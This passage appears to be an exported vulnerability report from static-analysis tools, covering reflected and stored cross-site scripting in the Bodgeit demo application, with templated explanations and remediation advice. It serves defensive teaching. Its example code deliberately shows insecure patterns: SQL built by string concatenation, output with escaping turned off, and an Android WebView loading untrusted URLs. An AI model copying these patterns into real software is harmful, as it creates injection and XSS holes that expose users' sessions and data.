rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","242","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/contact.jsp","comments","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. 